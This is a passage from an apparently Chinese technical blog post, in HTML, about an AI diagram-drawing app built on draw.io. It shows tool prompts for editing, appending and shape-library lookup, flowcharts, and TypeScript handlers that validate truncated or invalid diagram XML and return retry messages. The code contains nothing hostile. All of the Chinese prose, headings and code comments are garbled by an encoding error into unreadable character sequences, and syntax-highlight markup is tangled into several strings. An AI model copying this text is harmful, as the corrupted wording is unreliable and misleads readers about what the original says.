â€”updateï¼šé€šè¿‡å®ƒçš„<span class="hljs-built_in">id</span>å°†ç°æœ‰å•å…ƒæ ¼æ›¿æ¢ã€‚æä¾›cell_idå’Œå®Œæ•´çš„new_xmlã€‚
â€”addï¼šæ·»åŠ æ–°çš„å•å…ƒæ ¼ã€‚æä¾›cell_idï¼ˆæ–°çš„å”¯ä¸€<span class="hljs-built_in">id</span>ï¼‰å’Œnew_xmlã€‚
â€”deleteï¼šåˆ é™¤å•å…ƒæ ¼ã€‚çº§è”æ˜¯è‡ªåŠ¨çš„ï¼šå­çº§å’Œè¾¹ï¼ˆæº/ç›®æ ‡ï¼‰è¢«è‡ªåŠ¨åˆ é™¤ã€‚åªèƒ½æŒ‡å®šä¸€ä¸ªcell_idã€‚

å¯¹äºæ›´æ–°/æ·»åŠ ï¼Œnew_xmlå¿…é¡»æ˜¯ä¸€ä¸ªå®Œæ•´çš„mxCellå…ƒç´ ï¼ŒåŒ…æ‹¬mxGeometryã€‚

âš ï¸JSON ESCAPING: new_xmlä¸­çš„æ¯ä¸€ä¸ªâ€œå¿…é¡»è¢«è½¬ä¹‰ä¸º\\â€ã€‚ç¤ºä¾‹ï¼š<span class="hljs-built_in">id</span>=\\"5\\" value=\\â€œLabel\\â€

â€”æ·»åŠ ä¸€ä¸ªçŸ©å½¢ï¼š
{<span class="hljs-string">"operations"</span>: [{<span class="hljs-string">"operation"</span>: <span class="hljs-string">"add"</span>, <span class="hljs-string">"cell_id"</span>: <span class="hljs-string">"rect-1"</span>, <span class="hljs-string">"new_xml"</span>: <span class="hljs-string">"&lt;mxCell id=\\"</span>rect-1\\" value=\\"Hello\\" style=\\"rounded=0; \\" vertex=\\"1\\" parent=\\"1\\"&gt;&lt;mxGeometry x=\\"100\\" y=\\"100\\" width=\\"120\\" height=\\"60\\" as=\\"geometry\\"/&gt;&lt;/mxCell&gt;<span class="hljs-string">"}]}

ç¤ºä¾‹-åˆ é™¤å®¹å™¨ï¼ˆå­èŠ‚ç‚¹å’Œè¾¹ç¼˜è‡ªåŠ¨åˆ é™¤ï¼‰ï¼š
{"</span>operations<span class="hljs-string">": [{"</span>operation<span class="hljs-string">": "</span>delete<span class="hljs-string">", "</span>cell_id<span class="hljs-string">": "</span>2<span class="hljs-string">"}]}

</span></code></pre>
<h6 data-id="heading-12"><code>append_diagram</code></h6>
<pre><code class="hljs language-markdown" lang="markdown">å½“å…ˆå‰çš„display<span class="hljs-emphasis">_diagramè¾“å‡ºç”±äºé•¿åº¦é™åˆ¶è€Œè¢«æˆªæ–­æ—¶ï¼Œç»§ç»­ç”Ÿæˆå›¾è¡¨XMLã€‚

ä½•æ—¶ä½¿ç”¨ï¼šä»…åœ¨display_</span>diagramè¢«æˆªæ–­åè°ƒç”¨æ­¤å·¥å…·ï¼ˆæ‚¨å°†çœ‹åˆ°å…³äºæˆªæ–­çš„é”™è¯¯æ¶ˆæ¯ï¼‰ã€‚

å…³é”®çš„æŒ‡ä»¤:
<span class="hljs-bullet">1.</span> ä¸åŒ…æ‹¬ä»»ä½•åŒ…è£…æ ‡ç­¾-åªæ˜¯ç»§ç»­mxCellå…ƒç´ 
<span class="hljs-bullet">2.</span> ä»ä¹‹å‰è¾“å‡ºåœæ­¢çš„åœ°æ–¹ç»§ç»­
<span class="hljs-bullet">3.</span> å®Œæˆå‰©ä½™çš„mxCellå…ƒç´ 
<span class="hljs-bullet">4.</span> å¦‚æœä»ç„¶è¢«æˆªæ–­ï¼Œä½¿ç”¨ä¸‹ä¸€ä¸ªç‰‡æ®µå†æ¬¡è°ƒç”¨append<span class="hljs-emphasis">_diagram

ä¾‹å¦‚ï¼šå¦‚æœå‰é¢çš„è¾“å‡ºä»¥â€˜<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">mxCell</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"x"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"rounded=1 â€œç»“å°¾ï¼Œåˆ™ç»§ç»­ä»¥â€™ï¼›â€ vertex="</span><span class="hljs-attr">1</span>"&gt;</span></span>â€¦â€™å¹¶å®Œæˆå‰©ä¸‹çš„å…ƒç´ ã€‚

</span></code></pre>
<h6 data-id="heading-13"><code>get_shape_library</code></h6>
<p>è¿™äº›å½¢çŠ¶/å›¾æ ‡æ–‡æ¡£å†…å®¹æ”¾ç½®äº<code>docs\shape-libraries</code>ï¼Œå®ƒçš„å®é™…ä½œç”¨æ˜¯åœ¨è°ƒç”¨å…¶ä»–ç”»å¸ƒå·¥å…·å‰æ‰§è¡Œçš„é¢å¤–çŸ¥è¯†è·å–ã€‚</p>
<pre><code class="hljs language-diff" lang="diff">è·å–`draw.io`å½¢çŠ¶/å›¾æ ‡åº“æ–‡æ¡£ï¼ŒåŒ…å«æ ·å¼è¯­æ³•å’Œå½¢çŠ¶åç§°ã€‚

å¯ç”¨åº“:
<span class="hljs-deletion">- Cloud: aws4, azure2, gcp2, alibaba_cloud, openstack, salesforce</span>
<span class="hljs-deletion">- Networking: cisco19, network, kubernetes, vvd, rack</span>
<span class="hljs-deletion">- Business: bpmn, lean_mapping</span>
<span class="hljs-deletion">- General: flowchart, basic, arrows2, infographic, sitemap</span>
<span class="hljs-deletion">- UI/Mockups: android</span>
<span class="hljs-deletion">- Enterprise: citrix, sap, mscae, atlassian</span>
<span class="hljs-deletion">- Engineering: fluidpower, electrical, pid, cabinets, floorplan</span>
<span class="hljs-deletion">- Icons: webicons</span>

è°ƒç”¨æ­¤å·¥å…·å¯è·å–ç‰¹å®šåº“çš„å½¢çŠ¶åç§°å’Œç”¨æ³•è¯­æ³•ã€‚
</code></pre>
<blockquote>
<p>ä¸å…¶ä»–å·¥å…·æœ‰å·®å¼‚çš„æ˜¯è¿™ä¸€å·¥å…·å±äºæœåŠ¡ç«¯å·¥å…·ï¼Œèƒ½å¤Ÿç›´æ¥è¿”å›ï¼Œè€Œå…¶ä½™ä¸‰ä¸ªæ§åˆ¶ç”»å¸ƒçš„å·¥å…·éœ€è¦ä¸å‰ç«¯äº¤äº’ï¼Œåœ¨è¯¥é¡¹ç›®ä¸­ï¼Œä½¿ç”¨äº†<code>ai.js</code>å’Œ<code>@ai-sdk/react</code>è¿™ä¸¤ä¸ªåº“ç®€åŒ–äº†å¤æ‚çš„å¤§æ¨¡å‹ä¸å‰ç«¯å·¥å…·çš„è°ƒç”¨äº¤äº’ï¼Œå…·ä½“å‚è€ƒï¼š[[é€šè¿‡<code>ai.js</code>ä¸<code>@ai-sdk</code>å®ç°å‰åç«¯toolæ³¨å…¥ä¸äº¤äº’]]</p>
</blockquote>
<h5 data-id="heading-14">c.æ€»ç»“</h5>
<p>æç¤ºè¯éƒ¨åˆ†å®šä¹‰äº†å„ç±»å·¥å…·ï¼ˆæœåŠ¡ç«¯/å®¢æˆ·ç«¯ï¼‰åŠå…¶ç¼–æ’ã€æä¾›äº†ä¸€äº›æ ·ä¾‹ï¼ˆ<code>few-shot</code>ï¼‰ã€åˆ¶å®šäº†ä¸€äº›ç»˜åˆ¶è§„èŒƒã€æè¿°äº†æ ·å¼è§„åˆ™ï¼›æ­¤å¤–åœ¨æ›´æ–°æ—¶ï¼Œé™¤äº†å½“å‰ç”»å¸ƒçš„æ’å¸ƒæ•°æ®è¿˜é¢å¤–æ³¨å…¥äº†ä¸Šä¸€æ¬¡æ¨¡å‹ç”Ÿæˆçš„å›¾æ•°æ®ï¼Œä½¿å¾—æ¨¡å‹æ›´å¥½çš„ç†è§£ç”¨æˆ·è¡Œä¸ºè¿›è¡Œåç»­æ’å¸ƒã€‚</p>
<h4 data-id="heading-15">3.å®¢æˆ·ç«¯æ‰§è¡Œå¤„ç†</h4>
<blockquote>
<p>ä»£ç ä½äº<code>hooks\use-diagram-tool-handlers.ts</code></p>
</blockquote>
<h5 data-id="heading-16">a.<code>display_diagram</code></h5>
<p>æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-css" lang="css">flowchart <span class="hljs-selector-tag">TD</span> 
<span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[<span class="hljs-string">"æå–toolCall.inputä¸­çš„xmlå­—ç¬¦ä¸²"</span>]</span> --&gt; C<span class="hljs-selector-attr">[<span class="hljs-string">"æ£€æµ‹XMLæ˜¯å¦æˆªæ–­ï¼ˆisMxCellXmlCompleteï¼‰"</span>]</span>
C --&gt;|æˆªæ–­ï¼ˆisTruncated=trueï¼‰| D<span class="hljs-selector-attr">[<span class="hljs-string">"å­˜å‚¨ä¸å®Œæ•´XMLåˆ°partialXmlRef"</span>]</span>
D --&gt; E<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›é”™è¯¯æç¤ºï¼Œè¦æ±‚è°ƒç”¨append_diagramç»­ä¼ "</span>]</span>
E --&gt; F<span class="hljs-selector-attr">[<span class="hljs-string">"returnç»ˆæ­¢å‡½æ•°"</span>]</span>
C --&gt;|å®Œæ•´ï¼ˆisTruncated=falseï¼‰| G<span class="hljs-selector-attr">[<span class="hljs-string">"é‡ç½®partialXmlRefä¸ºç©º"</span>]</span>
G --&gt; H<span class="hljs-selector-attr">[<span class="hljs-string">"ç”¨wrapWithMxFileåŒ…è£…XMLä¸ºdraw.ioæ ‡å‡†æ ¼å¼"</span>]</span>
H --&gt; <span class="hljs-selector-tag">I</span><span class="hljs-selector-attr">[<span class="hljs-string">"è°ƒç”¨onDisplayChartéªŒè¯å¹¶åŠ è½½XML"</span>]</span>
<span class="hljs-selector-tag">I</span> --&gt;|éªŒè¯å¤±è´¥ï¼ˆæœ‰validationErrorï¼‰| J<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›é”™è¯¯æç¤ºï¼Œè¦æ±‚ä¿®å¤XMLé‡è¯•"</span>]</span>
<span class="hljs-selector-tag">I</span> --&gt;|éªŒè¯æˆåŠŸï¼ˆæ— validationErrorï¼‰| K<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›æˆåŠŸæç¤ºï¼Œå‰ç«¯æ¸²æŸ“å›¾è¡¨"</span>]</span>
</code></pre>
<p>ä»£ç ä¸»è¦å†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleDisplayDiagram</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">
Â  toolCall: ToolCall,
Â  addToolOutput: AddToolOutputFn,
</span>) =&gt; {
Â  <span class="hljs-keyword">const</span> { xml } = toolCall.<span class="hljs-property">input</span> <span class="hljs-keyword">as</span> { <span class="hljs-attr">xml</span>: <span class="hljs-built_in">string</span> }

  <span class="hljs-comment">// æ£€æŸ¥å®Œæ•´æ€§</span>
Â  <span class="hljs-keyword">const</span> isTruncated = !<span class="hljs-title function_">isMxCellXmlComplete</span>(xml)
Â  <span class="hljs-keyword">if</span> (isTruncated) {
Â  Â  Â  <span class="hljs-comment">// ä¸´æ—¶å­˜å‚¨ï¼Œä¾¿äºåç»­å®Œå–„</span>
Â  Â  Â  partialXmlRef.<span class="hljs-property">current</span> = xml
     <span class="hljs-comment">// è¿”å›å¤§æ¨¡å‹éœ€è¦ç»­å†™</span>
Â  Â  Â  <span class="hljs-keyword">const</span> partialEnding = partialXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">slice</span>(-<span class="hljs-number">500</span>)
Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"display_diagram"</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`Output was truncated due to length limits. Use the append_diagram tool to continue.

Your output ended with:
\`\`\`
<span class="hljs-subst">${partialEnding}</span>
\`\`\`

NEXT STEP: Call append_diagram with the continuation XML.
- Do NOT include wrapper tags or root cells (id="0", id="1")
- Start from EXACTLY where you stopped
- Complete all remaining mxCell elements`</span>,
Â  Â  Â  })
Â  Â  Â  <span class="hljs-keyword">return</span>
Â  }

Â  <span class="hljs-keyword">const</span> finalXml = xml
Â  partialXmlRef.<span class="hljs-property">current</span> = <span class="hljs-string">""</span>

  <span class="hljs-comment">// åŒ…è£…ä¸º`draw.io`è¯†åˆ«çš„å®Œæ•´æ ¼å¼</span>
Â  <span class="hljs-keyword">const</span> fullXml = <span class="hljs-title function_">wrapWithMxFile</span>(finalXml)

Â  <span class="hljs-comment">// æ¸²æŸ“æ£€éªŒ</span>
Â  <span class="hljs-keyword">const</span> validationError = <span class="hljs-title function_">onDisplayChart</span>(fullXml)
Â  <span class="hljs-keyword">if</span> (validationError) {
Â  Â  Â  <span class="hljs-comment">// è¿”å›éœ€è¦é‡è¯•</span>
Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"display_diagram"</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`<span class="hljs-subst">${validationError}</span>
Please fix the XML issues and call display_diagram again with corrected XML.
Your failed XML:
\`\`\`xml
<span class="hljs-subst">${finalXml}</span>
\`\`\``</span>,
Â  Â  Â  })
Â  } <span class="hljs-keyword">else</span> {
	  <span class="hljs-comment">// è¿”å›æˆåŠŸ</span>
Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"display_diagram"</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  <span class="hljs-attr">output</span>: <span class="hljs-string">"Successfully displayed the diagram."</span>,
Â  Â  Â  })
Â  }
}

</code></pre>
<h5 data-id="heading-17">b.<code>edit_diagram</code></h5>
<p>æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-css" lang="css">
flowchart <span class="hljs-selector-tag">TD</span>
    <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[<span class="hljs-string">"æå–ç¼–è¾‘æ“ä½œåˆ—è¡¨operations"</span>]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[<span class="hljs-string">"ä¸‰çº§å…œåº•è·å–åŸå§‹XMLâ†’currentXml"</span>]</span>
    <span class="hljs-selector-tag">B</span> --&gt; C<span class="hljs-selector-attr">[<span class="hljs-string">"è°ƒç”¨applyDiagramOperationsæ‰§è¡Œç¼–è¾‘"</span>]</span>
    C --&gt; D{æ“ä½œæ˜¯å¦å‡ºé”™ï¼Ÿ&lt;br/&gt;errors<span class="hljs-selector-class">.length</span>&gt;<span class="hljs-number">0</span>?}
    D --&gt;|æ˜¯| E<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›å…·ä½“çš„æ“ä½œå¤±è´¥å³ä¿®å¤æç¤º+æ¸…ç†ç¼“å­˜â†’ç»“æŸ"</span>]</span>
    D --&gt;|å¦| F<span class="hljs-selector-attr">[<span class="hljs-string">"éªŒè¯ç¼–è¾‘åçš„XMLåˆæ³•æ€§"</span>]</span>
    F --&gt; G{XMLæ˜¯å¦åˆæ³•ï¼Ÿ&lt;br/&gt;validationErroræ˜¯å¦å­˜åœ¨ï¼Ÿ}
    G --&gt;|å¦ï¼ˆéæ³•ï¼‰| H<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›XMLæ— æ•ˆ,éœ€è¦ä¿®å¤çš„æç¤º+æ¸…ç†ç¼“å­˜â†’ç»“æŸ"</span>]</span>
    G --&gt;|æ˜¯ï¼ˆåˆæ³•ï¼‰| <span class="hljs-selector-tag">I</span><span class="hljs-selector-attr">[<span class="hljs-string">"å¯¼å‡ºç¼–è¾‘åçš„å›¾è¡¨+è¿”å›æˆåŠŸæç¤º+æ¸…ç†ç¼“å­˜â†’ç»“æŸ"</span>]</span>
    C --&gt; J<span class="hljs-selector-attr">[æ•è·å…¨å±€å¼‚å¸¸]</span>
    J --&gt; K<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›é€šç”¨é”™è¯¯ï¼Œéœ€è¦ä¿®å¤çš„æç¤º+æ¸…ç†ç¼“å­˜â†’ç»“æŸ"</span>]</span>
    F --&gt; J
    <span class="hljs-selector-tag">I</span> --&gt; J

</code></pre>
<p>ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleEditDiagram</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">
Â  Â  toolCall: ToolCall,
Â  Â  addToolOutput: AddToolOutputFn,
</span>) =&gt; {
Â  Â  <span class="hljs-keyword">const</span> { operations } = toolCall.<span class="hljs-property">input</span> <span class="hljs-keyword">as</span> {
Â  Â  Â  Â  <span class="hljs-attr">operations</span>: <span class="hljs-title class_">DiagramOperation</span>[]
Â  Â  }
Â  Â  <span class="hljs-keyword">let</span> currentXml = <span class="hljs-string">""</span>

Â  Â  <span class="hljs-keyword">try</span> {
		<span class="hljs-comment">/** 
		* 1.ä» `editDiagramOriginalXmlRef.current`ï¼ˆæŒ‰ toolCallId ç´¢å¼•ï¼‰è·å–æµå¼å¤„ç†æ—¶æ•è·çš„åŸå§‹ XMLï¼ˆä¿è¯ç¼–è¾‘åŸºäºæœ€æ–°çš„åŸºå‡†ç‰ˆæœ¬ï¼‰ï¼›
        * 2.å¦‚æœæ²¡æœ‰ä¸Šè¿°æ•°æ®ï¼Œä» `chartXMLRef.current`ï¼ˆç¼“å­˜çš„å›¾è¡¨ XMLï¼‰è·å–ï¼›
        * 3.å…œåº•è°ƒç”¨ `onFetchChart(false)` ä» iframe ä¸­å¯¼å‡ºå½“å‰å›¾è¡¨çš„ XMLã€‚
		*/</span>
Â  Â  Â  Â  <span class="hljs-keyword">const</span> originalXml = editDiagramOriginalXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">get</span>(
Â  Â  Â  Â  Â  Â  toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  )
Â  Â  Â  Â  <span class="hljs-keyword">if</span> (originalXml) {
Â  Â  Â  Â  Â  Â  currentXml = originalXml
Â  Â  Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">const</span> cachedXML = chartXMLRef.<span class="hljs-property">current</span>
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">if</span> (cachedXML) {
Â  Â  Â  Â  Â  Â  Â  Â  currentXml = cachedXML
Â  Â  Â  Â  Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  Â  Â  Â  Â  currentXml = <span class="hljs-keyword">await</span> <span class="hljs-title function_">onFetchChart</span>(<span class="hljs-literal">false</span>)
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  }
  
Â  Â  Â  Â  <span class="hljs-keyword">const</span> { applyDiagramOperations } = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">"@/lib/utils"</span>)
Â  Â  Â  Â  <span class="hljs-keyword">const</span> { <span class="hljs-attr">result</span>: editedXml, errors } = <span class="hljs-title function_">applyDiagramOperations</span>(
Â  Â  Â  Â  Â  Â  currentXml,
Â  Â  Â  Â  Â  Â  operations,
Â  Â  Â  Â  )
		<span class="hljs-comment">// å¦‚æœéƒ¨åˆ†æ“ä½œæ‰§è¡Œé”™è¯¯ï¼Œè¿”å›æ¨¡å‹å“ªäº›å‡ºé”™</span>
Â  Â  Â  Â  <span class="hljs-keyword">if</span> (errors.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">const</span> errorMessages = errors
Â  Â  Â  Â  Â  Â  Â  Â  .<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span><span class="hljs-string">`- <span class="hljs-subst">${e.<span class="hljs-keyword">type</span>}</span> on cell_id="<span class="hljs-subst">${e.cellId}</span>": <span class="hljs-subst">${e.message}</span>`</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">"\n"</span>)
Â  Â  Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"edit_diagram"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`Some operations failed:\n<span class="hljs-subst">${errorMessages}</span>
Current diagram XML:
\`\`\`xml
<span class="hljs-subst">${currentXml}</span>
\`\`\`
Please check the cell IDs and retry.`</span>,
Â  Â  Â  Â  Â  Â  })
Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// æ¸…é™¤ç¼“å­˜</span>
Â  Â  Â  Â  Â  Â  editDiagramOriginalXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">delete</span>(toolCall.<span class="hljs-property">toolCallId</span>)
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">return</span>
Â  Â  Â  Â  }


Â  Â  Â  Â  <span class="hljs-comment">// æ¸²æŸ“æ ¡éªŒ</span>
Â  Â  Â  Â  <span class="hljs-keyword">const</span> validationError = <span class="hljs-title function_">onDisplayChart</span>(editedXml)
Â  Â  Â  Â  <span class="hljs-keyword">if</span> (validationError) {
Â  Â  Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"edit_diagram"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`Edit produced invalid XML: <span class="hljs-subst">${validationError}</span>
Current diagram XML:
\`\`\`xml
<span class="hljs-subst">${currentXml}</span>
\`\`\`
Please fix the operations to avoid structural issues.`</span>,
Â  Â  Â  Â  Â  Â  })
Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// æ¸…é™¤ç¼“å­˜</span>
Â  Â  Â  Â  Â  Â  editDiagramOriginalXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">delete</span>(toolCall.<span class="hljs-property">toolCallId</span>)
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">return</span>
Â  Â  Â  Â  }
Â  Â  Â  Â  <span class="hljs-comment">// æˆåŠŸ</span>
Â  Â  Â  Â  <span class="hljs-title function_">onExport</span>()
Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"edit_diagram"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">output</span>: <span class="hljs-string">`Successfully applied <span class="hljs-subst">${operations.length}</span> operation(s) to the diagram.`</span>,
Â  Â  Â  Â  })
Â  Â  Â  Â  <span class="hljs-comment">// æ¸…é™¤ç¼“å­˜</span>
Â  Â  Â  Â  editDiagramOriginalXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">delete</span>(toolCall.<span class="hljs-property">toolCallId</span>)

Â  Â  } <span class="hljs-keyword">catch</span> (error) {
		<span class="hljs-comment">// jsæ‰§è¡Œçš„æœªçŸ¥é”™è¯¯</span>
Â  Â  Â  Â  <span class="hljs-keyword">const</span> errorMessage =
Â  Â  Â  Â  Â  Â  error <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span> ? error.<span class="hljs-property">message</span> : <span class="hljs-title class_">String</span>(error)
Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"edit_diagram"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`Edit failed: <span class="hljs-subst">${errorMessage}</span>
Current diagram XML:
\`\`\`xml
<span class="hljs-subst">${currentXml || <span class="hljs-string">"No XML available"</span>}</span>
\`\`\`
Please check cell IDs and retry, or use display_diagram to regenerate.`</span>,
Â  Â  Â  Â  })
Â  Â  Â  Â  <span class="hljs-comment">// æ¸…é™¤ç¼“å­˜</span>
Â  Â  Â  Â  editDiagramOriginalXmlRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">delete</span>(toolCall.<span class="hljs-property">toolCallId</span>)

Â  Â  }

}

</code></pre>
<h5 data-id="heading-18">c.<code>append_diagram</code></h5>
<p>æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-css" lang="css">
flowchart <span class="hljs-selector-tag">TD</span>
    <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[<span class="hljs-string">"æå–ç»­ä¼ çš„XMLç‰‡æ®µ"</span>]</span> --&gt; <span class="hljs-selector-tag">B</span>{"æ ¡éªŒæ˜¯å¦åˆè§„ï¼ˆå³æ»¡è¶³æç¤ºè¯ä¸­çš„è§„èŒƒï¼‰"}
    <span class="hljs-selector-tag">B</span> --&gt;|æ˜¯| D<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›è¿è§„,é‡æ–°ç»­ä¼ çš„æç¤º+ç»ˆæ­¢å‡½æ•°"</span>]</span>
    <span class="hljs-selector-tag">B</span> --&gt;|å¦| E<span class="hljs-selector-attr">[<span class="hljs-string">"æ‹¼æ¥XMLï¼špartialXmlRef += æœ¬æ¬¡XML"</span>]</span>
    E --&gt; F<span class="hljs-selector-attr">[<span class="hljs-string">"éªŒè¯æ‹¼æ¥åXMLæ˜¯å¦å®Œæ•´"</span>]</span>
    F --&gt; G{æ˜¯å¦å®Œæ•´ï¼Ÿ&lt;br/&gt;isComplete=true?}
    G --&gt;|æ˜¯| H<span class="hljs-selector-attr">[<span class="hljs-string">"é‡ç½®ç¼“å­˜â†’åŒ…è£…XMLâ†’éªŒè¯åˆæ³•æ€§"</span>]</span>
    H --&gt; <span class="hljs-selector-tag">I</span>{XMLæ˜¯å¦åˆæ³•ï¼Ÿ&lt;br/&gt;validationErrorå­˜åœ¨ï¼Ÿ}
    <span class="hljs-selector-tag">I</span> --&gt;|æ˜¯| J<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›éªŒè¯å¤±è´¥æç¤º"</span>]</span>
    <span class="hljs-selector-tag">I</span> --&gt;|å¦| K<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›æ‹¼æ¥æˆåŠŸæç¤º"</span>]</span>
    G --&gt;|å¦| L<span class="hljs-selector-attr">[<span class="hljs-string">"è¿”å›ä»éœ€ç»­ä¼ æç¤º"</span>]</span>

</code></pre>
<p>ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleAppendDiagram</span> = (<span class="hljs-params">
Â  Â  toolCall: ToolCall,
Â  Â  addToolOutput: AddToolOutputFn,
</span>) =&gt; {
Â  Â  <span class="hljs-keyword">const</span> { xml } = toolCall.<span class="hljs-property">input</span> <span class="hljs-keyword">as</span> { <span class="hljs-attr">xml</span>: <span class="hljs-built_in">string</span> }
Â  Â  <span class="hljs-keyword">const</span> trimmed = xml.<span class="hljs-title function_">trim</span>()
Â  Â  <span class="hljs-comment">// æ£€éªŒæ˜¯å¦æ»¡è¶³æç¤ºè¯è§„èŒƒ</span>
Â  Â  <span class="hljs-keyword">const</span> isFreshStart =
Â  Â  Â  Â  trimmed.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"&lt;mxGraphModel"</span>) ||
Â  Â  Â  Â  trimmed.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"&lt;root"</span>) ||
Â  Â  Â  Â  trimmed.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"&lt;mxfile"</span>) ||
Â  Â  Â  Â  trimmed.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'&lt;mxCell id="0"'</span>) ||
Â  Â  Â  Â  trimmed.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'&lt;mxCell id="1"'</span>)
Â  Â  <span class="hljs-keyword">if</span> (isFreshStart) {
Â  Â      <span class="hljs-comment">// ä¸æ»¡è¶³</span>
Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"append_diagram"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
